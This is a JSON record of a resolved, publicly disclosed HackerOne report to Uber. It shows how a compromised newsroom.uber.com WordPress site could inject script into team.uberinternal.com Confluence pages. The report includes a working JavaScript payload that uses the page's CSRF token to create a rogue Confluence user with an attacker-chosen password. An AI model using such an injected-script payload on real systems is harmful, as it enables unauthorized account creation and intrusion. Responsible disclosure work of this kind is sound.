{
  "id": 136531,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzY1MzE=",
  "url": "https://hackerone.com/reports/136531",
  "title": "Compromising Atlassian Confluence (team.uberinternal.com) via WordPress (newsroom.uber.com)",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2016-05-05T15:05:45.831Z",
  "submitted_at": "2016-05-05T15:05:45.831Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "jouko",
    "url": "/jouko",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/mqyrwb0f5m6e7yq17l0nrhhz32yw/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 314,
    "url": "https://hackerone.com/uber",
    "handle": "uber",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Uber",
      "twitter_handle": "",
      "website": "https://www.uber.com",
      "about": ""
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2016-06-06T09:57:03.633Z",
  "bug_reporter_agreed_on_going_public_at": "2016-05-07T09:57:00.118Z",
  "team_member_agreed_on_going_public_at": null,
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "This issue has some relevance to most of my previous submissions so I thought it's clearer if I open a new ticket about it.\n\nI understood you've intended the various *.uber.com WordPress sites to be isolated so that compromising them wouldn't impact Uber's internal network or user data. This has been the main reason why you've assessed the WP vulnerabilities as low risk. However, it looks like to me compromising the newroom.uber.com site hosted at WPEngine opens a trivial way to an attacker to compromise team.uberinternal.com too.\n\nMany (possibly most or all) pages on the said Atlassian Confluence environment refer a script hosted on newsroom.uber.com. For example on the 404 error page:\n~~~~ html\n<script src=\"https://newsroom.uber.com/wp-content/uploads/adrum.js\"></script>\n~~~~\nAn attacker exploiting a vulnerability on *newsroom* can modify the adrum.js file. I've previously demonstrated controlling files under the webroot.\n\nAny injected script would be evaluated for Uber employees logged on Confluence. For instance, this example script (tested on my local test Confluence) appended in adrum.js would create a new Confluence user with a password chosen by the attacker:\n~~~~ javascript\n(function(){\nvar token=AJS.Meta.get('atl-token');\nvar x=new XMLHttpRequest();\nx.open('POST','/admin/users/docreateuser.action');\nx.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\");\nx.send('atl_token='+token+'&username=attacker&fullName=foo&email=new@attacker.com&password=new&confirm=new');\n})();\n~~~~\nUser management in Confluence has an additional security measure: an admin password is asked before allowing the operation. However, the injected script would attempt to create the user on every pageload, and if an administrator enters the user management legitimately any time, the request succeeds.\n\nOf course, this is merely one simple example of what the injected script could do.\n",
  "weakness": {
    "id": 75,
    "name": "Privilege Escalation"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2016-06-06T09:57:02.490Z",
  "allow_singular_disclosure_after": -293344450.116227,
  "singular_disclosure_allowed": true,
  "vote_count": 4,
  "voters": [
    "fizhimchik",
    "japz",
    "spetr0x",
    "dyabla"
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
